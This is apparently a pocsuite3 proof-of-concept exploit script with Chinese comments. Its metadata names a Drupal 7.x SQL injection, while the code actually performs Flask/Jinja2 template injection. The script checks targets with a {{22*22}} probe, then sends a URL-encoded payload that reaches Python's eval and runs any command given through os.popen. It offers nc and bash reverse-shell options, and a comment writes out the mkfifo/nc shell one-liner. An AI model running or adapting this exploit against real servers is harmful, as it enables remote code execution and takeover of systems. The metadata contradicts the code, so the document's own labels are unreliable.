from logging import exception
from pocsuite3.api import Output,POCBase,register_poc,requests,OptDict
from collections import OrderedDict
# from pocsuite3.api import get_listener_ip,get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
# from pocsuite3.lib.core.enums import VUL_TYPE
# from pocsuite3.lib.utils import random_str, url2ip

class DemoPOC(POCBase): #继承pocbase
    vulID='2112' #漏洞编号，若提交漏洞的同时提交PoC，则写成0
    version='1' #poc版本，默认为1
    author='cbygsec' #此poc作者
    vulDate='2021-5-14'#poc公开时间
    createDate = '2021-5-14'#编写poc日期
    updateDate = '2021-5-14'#更新poc日期
    references = ['unkown'] #漏洞来源地址
    name = 'Drupal 7.x /includes/database/database.inc SQL注入漏洞POC'#poc名称
    appName = 'flask'#漏洞应用名称
    appVersion = '7.x'#漏洞影响版本
    vulTYPE = 'SQL Injection' #漏洞类型
    desc = """
    Drupall 在处理in语句时，展开的数组时key带入sql语句导致sql注入，可以添加管理员，造成信息泄露
    """ #漏洞描述
    samples=[] #测试成功网址
    install_requires = [] #poc依赖第三方模块
    pocDesc = """ POC用法描述 """ #POC用法描述


    def _verify(self): #编写验证模式
        # 验证代码
        result = {}
        path = "/?name="
        url =self.url+path
        payload = "{{22*22}}"
        try:
           resq = requests.get(url+payload)
           if resq and resq.status_code == 200 and '484' in resq.text:
               result['VerifyInfo'] = {}
               result['VerifyInfo']['URL'] = url
               result['VerifyInfo']['Name'] = payload
        except Exception as e:
            pass
        return self.parse_output(result)

    def _attack(self):
        result = {}
        path = "/?name="
        url = self.url + path
        cmd = self.get_option("command") #获取command参数后面的命令
        payload = '%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__("os").popen("'+cmd+'").read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D'
        # print(payload)
        try:
            resq = requests.get(url + payload) #发起请求
            t = resq.text 
            t = t.replace('\n', '').replace('\r', '') #去除里面的\n和\r
            print(t)
            t = t.replace(" ", "")#去除里面的空格
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url #将url赋值到结果
            result['VerifyInfo']['Name'] = payload#将payload赋值到结果
        except Exception as e:
            return
        return self.parse_output(result) #输出函数

    def parse_output(self,result):  #自定义输出函数
        output=Output(self)#实例化输出结果
        if result:
            output.success(result)#成功结果  
        else:
            output.fail('target is not vulnerable')#失败结果
        return output

    def _options(self):  # 结束command参数并执行#_options为私有方法
        o = OrderedDict() ##用OrderedDict类实例化一个o对象
        payload = {
            "nc": REVERSE_PAYLOAD.NC,#调用REVERSE_PAYLOAD类中的NC属性，NC = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f"""  这应该是nc的一个反弹命令
            "bash": REVERSE_PAYLOAD.BASH,#同上调用BASH属性
        }
        o["command"] = OptDict(selected="bash", default=payload)##提取字典中command的值，传入select参数，和default{}
        return o##返回o对象
register_poc(DemoPOC)#注册Poc类
